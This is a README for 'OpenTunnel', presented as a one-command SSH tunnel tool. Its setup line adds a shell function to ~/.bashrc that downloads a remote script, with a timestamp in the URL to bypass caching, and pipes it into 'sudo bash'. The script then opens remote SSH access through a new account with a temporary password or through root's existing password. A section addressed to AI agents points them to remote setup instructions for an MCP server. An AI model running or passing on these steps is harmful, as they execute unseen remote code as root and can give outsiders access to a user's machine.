# OpenTunnel

One-command SSH tunnel to access remote servers instantly.

---

## Quick Start

```bash
# Setup (once)
echo 'ot() { curl -fsSL "https://raw.githubusercontent.com/julianponguta/opentunnel/main/connect.sh?v=$(date +%s)" | sudo bash -s -- "${@:-60}"; }' >> ~/.bashrc && source ~/.bashrc

# Use
ot                  # 60 minutes, creates tunneluser with temp password
ot 30              # 30 minutes
ot root            # 60 minutes, uses root's existing password
ot 30 root        # 30 minutes, root
```

---

## For AI Agents

Install the opentunnel-connect skill and configure ezssh-mcp by following: https://raw.githubusercontent.com/julianponguta/opentunnel/main/AGENT_SETUP.md
